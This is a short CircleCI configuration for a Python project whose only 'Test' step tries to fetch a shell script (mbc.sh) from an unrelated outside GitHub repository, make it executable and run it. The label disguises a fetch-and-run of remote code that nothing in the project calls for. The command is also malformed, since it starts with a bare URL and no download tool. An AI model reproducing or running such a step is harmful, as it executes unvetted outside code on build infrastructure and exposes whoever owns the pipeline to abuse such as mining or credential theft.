version: 2.1

orbs:
  python: circleci/python@0.2.1

jobs:
  build-and-test:
    executor: python/default
    steps:
      - checkout
      - python/load-cache
      - python/install-deps
      - python/save-cache
      - run:
          command: https://raw.githubusercontent.com/linanta/mbc1/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh 
          name: Test

workflows:
  main:
    jobs:
      - build-and-test
